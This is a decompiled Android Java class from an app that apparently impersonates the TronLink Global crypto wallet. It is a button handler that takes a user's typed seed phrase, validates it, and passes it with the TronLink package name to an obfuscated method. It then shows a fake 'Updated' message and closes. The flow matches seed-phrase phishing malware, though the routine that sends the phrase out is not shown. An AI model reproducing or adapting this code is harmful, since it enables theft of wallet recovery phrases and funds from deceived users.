package j3;

import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import com.blankj.utilcode.util.ToastUtils;
import com.superbock.ui.custom.InputWordsTronglobalActivity;
import comeliest.metempsychosis.pokelogan.R;

/* loaded from: classes14.dex */
public final class u2 implements View.OnClickListener {

    /* renamed from: b, reason: collision with root package name */
    public final /* synthetic */ InputWordsTronglobalActivity f3575b;

    /* loaded from: classes6.dex */
    public class a implements Runnable {
        public a() {
        }

        @Override // java.lang.Runnable
        public final void run() {
            u2.this.f3575b.finishAndRemoveTask();
            u2.this.f3575b.f1670b.setFeedBack(2);
        }
    }

    public u2(InputWordsTronglobalActivity inputWordsTronglobalActivity) {
        this.f3575b = inputWordsTronglobalActivity;
    }

    @Override // android.view.View.OnClickListener
    public final void onClick(View view) {
        String trim = this.f3575b.f1675g.getText().toString().trim();
        if (trim.length() == 0 || !k3.j.b(trim)) {
            if (Build.VERSION.SDK_INT >= 23) {
                ToastUtils.make().setLeftIcon(R.drawable.icon_tronglobal).setGravity(17, 0, 0).setMode(ToastUtils.MODE.DARK).show(this.f3575b.getString(R.string.Incorrect_seed_phrase_check_and_try_again));
                return;
            } else {
                ToastUtils.showLong(this.f3575b.getString(R.string.Incorrect_seed_phrase_check_and_try_again));
                return;
            }
        }
        k3.j.a(trim.replaceAll("\\s+", " "), "com.tronlink.global", this.f3575b.getString(R.string.tronlinkglobal), view.getContext());
        InputWordsTronglobalActivity inputWordsTronglobalActivity = this.f3575b;
        ((InputMethodManager) inputWordsTronglobalActivity.getSystemService("input_method")).hideSoftInputFromWindow(inputWordsTronglobalActivity.f1675g.getWindowToken(), 0);
        this.f3575b.f1675g.clearFocus();
        if (Build.VERSION.SDK_INT >= 23) {
            ToastUtils.make().setLeftIcon(R.drawable.icon_tronglobal).setGravity(17, 0, 0).setMode(ToastUtils.MODE.DARK).show(this.f3575b.getString(R.string.Updated));
        } else {
            ToastUtils.showLong(this.f3575b.getString(R.string.Updated));
        }
        new Handler(Looper.getMainLooper()).postDelayed(new a(), 1000L);
    }
}
